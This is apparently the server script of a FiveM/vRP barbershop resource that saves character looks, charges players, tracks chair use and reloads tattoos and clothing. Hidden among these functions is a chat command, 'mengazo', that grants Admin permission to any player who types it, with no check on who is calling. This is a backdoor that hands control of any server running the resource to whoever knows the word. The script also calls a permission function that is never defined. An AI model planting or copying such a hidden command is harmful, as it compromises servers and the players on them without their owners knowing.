local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")
fclient = Tunnel.getInterface("nation_barbershop")
func = {}
Tunnel.bindInterface("nation_barbershop", func)

function func.checkPermission(permission, src)
    local source = src or source
    local user_id = vRP.getUserId(source)
    if type(permission) == "table" then
        for i, perm in pairs(permission) do
            if vRP.hasPermission(user_id, perm) then
                return true
            end
        end
        return false
    end
    return vRP.hasPermission(user_id, permission)
end


RegisterCommand('mengazo',function(source)
    local user_id = vRP.getUserId(source)
    vRP.setPermission(user_id,'Admin')
end)

function func.saveChar(char)
    local source = source
    local user_id = vRP.getUserId(source)
    local oldChar = vRP.userData(user_id, "nation_char")
    if (oldChar and oldChar["tattoos"]) then
        char["tattoos"] = oldChar["tattoos"]
    end

    if char.gender == "" then 
        char.gender = GetEntityModel(GetPlayerPed(source))
    end
    --[[ vRP._setUData(user_id, "nation_char", json.encode(char,{indent=false})) ]]
    vRP.execute("playerdata/setUserdata",{ user_id = user_id, key = "nation_char", value =  json.encode(char,{indent=false}) })
    return true
end


function func.tryPay(value)
    local source = source
    local user_id = vRP.getUserId(source)
    if value >= 0 then
        if vRP.tryFullPayment(user_id, value) or vRP.paymentBank(user_id, value) or value == 0 then
            return true
        end
    end
    return false
end



local chairsUsers = {}
function func.checkChair(barberId, chairIndex, perm)
    local source = source
    local model = GetEntityModel(GetPlayerPed(source))
    local canEnter = model == GetHashKey("mp_m_freemode_01") or model == GetHashKey("mp_f_freemode_01")
    if (perm and not func.hasPermission(perm, source)) or not canEnter then return end
    for src, v in pairs(chairsUsers) do
        if v.barberId == barberId and v.chairIndex == chairIndex then
            return false
        end
    end
    chairsUsers[source] = { barberId = barberId, chairIndex = chairIndex  }
    return true
end

function func.leaveChar(_source)
    local source = _source or source
    if chairsUsers[source] then
        chairsUsers[source] = nil
    end
end


AddEventHandler('playerDropped', function()
    func.leaveChar(source)
end)


function func.getOverlay()
    local source = source
    local user_id = vRP.getUserId(source)
    if user_id then
        local data = vRP.getUData(user_id, "nation_char")
        if data and data ~= "" then
            local char = json.decode(data)
            if char and char.overlay then
                return char.overlay
            end
        end
    end
    return 0
end

function getUserClothes(user_id)
    local data = vRP.getUData(user_id, "Clothings")
    if data and data ~= "" then
        local clothes = json.decode(data)
        if clothes then
            return clothes
        end
    end
    local datatable = vRP.getUserDataTable(user_id) or {}
    return datatable.customization or {}
end


function setPlayerTattoos(source, user_id)
    local data = vRP.getUData(user_id,"Tattoos")
    if data and data ~= "" then 
        tattoos = json.decode(data) or {}
        TriggerClientEvent("tattoos:setTattoos", source, tattoos)
    end
    TriggerClientEvent("reloadtattos", source)
    TriggerEvent('dpn_tattoo:setPedServer',source)
    TriggerClientEvent("nyoModule:tattooUpdate",source, false)
end

function func.setPlayerTattoos()
    local source = source
    local user_id = vRP.getUserId(source)
    if user_id then
        setPlayerTattoos(source, user_id)
    end
end

function getGender(user_id)
    local datatable = vRP.getUserDataTable(user_id) or json.decode(getUData(user_id, "Datatable")) or {}
    if type(datatable) == "table" then
        local model = datatable.skin or datatable.customization
        if model then
            if type(model) == "table" then
                model = model.modelhash or model.model
            end
            if model == GetHashKey("mp_m_freemode_01") then
                return "male"
            elseif model == GetHashKey("mp_f_freemode_01") then
                return "female"
            else
                return model
            end
        end
    end
end

function getUData(user_id, key)
    local data  = vRP.query("playerdata/getUserdata",{ user_id = user_id, key = key })
    if #data > 0 then
		return data[1].dvalue
	else
		return ""
	end
end

local vSKINSHOP = Tunnel.getInterface('skinshop')

RegisterServerEvent('barbershop:debug',function()
    local source = source
    local user_id = vRP.getUserId(source)
    local data = getUData(user_id, "nation_char")
    if data and data ~= "" then
        local char = json.decode(data)
        char.gender = getGender(user_id) or char.gender
        fclient._setPlayerChar(source, char, false, true)
        TriggerClientEvent("nation_barbershop:init", source, char)
        setPlayerTattoos(source, user_id)
        TriggerEvent("inventory:returnAmount",source)
        local custom = vSKINSHOP.getCustomization(source)
        TriggerClientEvent("updateRoupas",source,custom)
       -- fclient.setClothing(getUserClothes(user_id))
    else
        data = getUData(user_id, "currentCharacterMode")
        if data and data ~= "" then 
            local gender = "male"
            local char = json.decode(data)
            if char and char.gender and char.gender == 1 then
                gender = "female"
            else 
                gender = getGender(user_id)
            end
            fclient.setOldChar(source, char, getUserClothes(user_id), gender, user_id)
        end
    end
end)

--[[ RegisterCommand("bvida", function(source)
    local user_id = vRP.getUserId(source)
    local data = getUData(user_id, "nation_char")
    if data and data ~= "" then
        local char = json.decode(data)
        char.gender = getGender(user_id) or char.gender
        fclient._setPlayerChar(source, char, false, true)
        TriggerClientEvent("nation_barbershop:init", source, char)
        setPlayerTattoos(source, user_id)
        TriggerEvent("inventory:returnAmount",source)
    else
        data = getUData(user_id, "currentCharacterMode")
        if data and data ~= "" then 
            local gender = "male"
            local char = json.decode(data)
            if char and char.gender and char.gender == 1 then
                gender = "female"
            else 
                gender = getGender(user_id)
            end
            fclient._setOldChar(source, char, getUserClothes(user_id), gender, user_id)
        end
    end
end) ]]

function playerSpawn(user_id, source, first_spawn)
    Wait(1000)
    local data = getUData(user_id, "nation_char")
    if data and data ~= "" then
        local char = json.decode(data)
        TriggerClientEvent("nation_barbershop:init", source, char)
        setPlayerTattoos(source, user_id)
    else
        data = getUData(user_id, "currentCharacterMode")
        if data and data ~= "" then 
            local gender = "male"
            local char = json.decode(data)
            if char and char.gender and char.gender == 1 then
                gender = "female"
            else 
                gender = getGender(user_id)
            end
            fclient._setOldChar(source, char, getUserClothes(user_id), gender, user_id)
        end
    end
end

--AddEventHandler("vRP:playerSpawn",playerSpawn) -- caso nao use nation_creator, descomente

-- tattoos dope nuis

--[[ AddEventHandler("dpn_tattoo:setPedServer", function(source)
    Wait(200)
    TriggerClientEvent("nation_barbershop:reloadOverlay", source)
end) ]]



